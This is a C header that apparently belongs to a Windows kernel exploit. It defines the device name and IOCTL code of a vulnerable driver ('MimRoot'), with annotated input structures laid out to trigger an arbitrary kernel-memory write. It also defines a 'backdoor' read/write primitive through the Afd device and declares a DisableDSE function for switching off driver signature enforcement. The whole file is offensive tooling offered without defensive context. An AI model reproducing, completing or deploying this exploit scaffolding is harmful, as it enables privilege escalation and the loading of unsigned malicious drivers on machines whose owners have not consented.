#pragma once

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\MimRoot"
#define TARGET_IOCTL 0x3CEC04B

#define BACKDOOR_DEVICE "\\\\.\\GLOBALROOT\\Device\\Afd"
#define BACKDOOR_IOCTL 0x1209F

typedef struct _MIMKRNL_WRITE_INFO
{
	// Filler data.
	unsigned char Padding[32];		// Start Offset: 0, End Offset: 32
	// The address to write to (either user-mode or kernel-mode).
	void* pWriteAddress;			// Start Offset: 32, End Offset: 40
	// Filler data.
	unsigned long Padding2;			// Start Offset: 40, End Offset: 44
	// Must be 3 or 14.
	unsigned long MustBe3Or14;		// Start Offset: 44, End Offset: 48
	// Filler data.
	unsigned long Padding3;			// Start Offset: 48, End Offset: 56
	// Must be 0.
	unsigned long MustBeZero;		// Start Offset: 56, End Offset: 60
} MIMKRNL_WRITE_INFO, * PMIMKRNL_WRITE_INFO;

typedef struct _MIMKRNL_INPUT_BUFFER
{
	// Must be >= 1.
	unsigned long MustBeNonZero;						// Start Offset: 0, End Offset: 4
	// Filler data.
	unsigned char Padding[36];							// Start Offset: 4, End Offset: 40
	// Write information for the driver.
	PMIMKRNL_WRITE_INFO pWriteInfo;						// Start Offset: 40, End Offset: 48
	// Filler data.
	unsigned long long Padding2;						// Start Offset: 48, End Offset: 56
	// Must be > 0.
	unsigned long MustBeGreaterThan0;					// Start Offset: 56, End Offset: 60
	// Filler data.
	unsigned long Padding3;								// Start Offset: 60, End Offset: 64
	// Must be 0.
	unsigned long long MustBeZero;						// Start Offset: 64, End Offset: 72
	// The amount of data to write.
	unsigned long WriteCount;							// Start Offset: 72, End Offset: 76
	// Filler data.
	unsigned char Padding4[4020];						// Start Offset: 76, End Offset: 4096
	// Write data for the arbitrary write.
	unsigned long long WriteData;						// Start Offset: 4096, End Offset: 4104
} MIMKRNL_INPUT_BUFFER, * PMIMKRNL_INPUT_BUFFER;

typedef struct _BACKDOOR_RW_INPUT_BUFFER
{
	unsigned long long Dst;
	unsigned long long Size;
	unsigned long long Src;
} RW_INPUT_BUFFER, * PRW_INPUT_BUFFER;

char DisableDSE(void);
unsigned long PerformWrite(HANDLE hDevice);
char BackdoorReadWrite(void* Destination, void* Source, unsigned long long Size);